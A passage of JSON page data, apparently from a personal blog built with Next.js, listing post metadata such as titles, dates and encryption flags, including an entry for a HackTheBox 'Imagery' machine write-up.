Certificate","date":"2025-06-02","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason9 - Imagery","title":"HackTheBox - Season9 - Imagery","date":"2025-10-04","isEncrypted":true,"year":"2025","month":"10","day":"04"}]},"__N_SSG":true}